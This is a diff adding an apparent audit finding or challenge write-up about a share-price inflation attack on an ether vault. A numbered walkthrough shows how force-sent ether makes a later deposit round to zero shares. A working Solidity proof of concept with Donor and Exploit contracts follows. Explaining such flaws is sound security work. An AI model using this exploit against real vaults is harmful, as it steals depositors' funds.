@@ -1,0 +1,34 @@
+The bug is a share-price inflation attack. The vault prices shares on its raw ether balance, and a forced send can push ether into it without minting shares.
+
+1. The attacker deposits 1 wei and gets 1 share.
+2. The attacker force-sends the remaining ether (1 ether minus 1 wei) with a helper contract that selfdestructs into the vault. The vault then holds 1 ether against 1 share.
+3. A deposits 2 ether and receives `2e18 * 1 / 1e18 = 2` shares, so A is not harmed.
+4. The vault then holds 3 ether against 3 shares. B deposits 0.5 ether and receives `0.5e18 * 3 / 3e18 = 0` shares (rounded down), so B loses the whole deposit and redeems 0.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+interface IVault {
+    function deposit() external payable returns (uint256);
+}
+
+contract Donor {
+    constructor(address payable target) payable {
+        selfdestruct(target);
+    }
+}
+
+contract Exploit {
+    address public target;
+
+    constructor(address _target) payable {
+        target = _target;
+    }
+
+    function run() external {
+        IVault(target).deposit{value: 1}();
+        new Donor{value: address(this).balance}(payable(target));
+    }
+}
+```
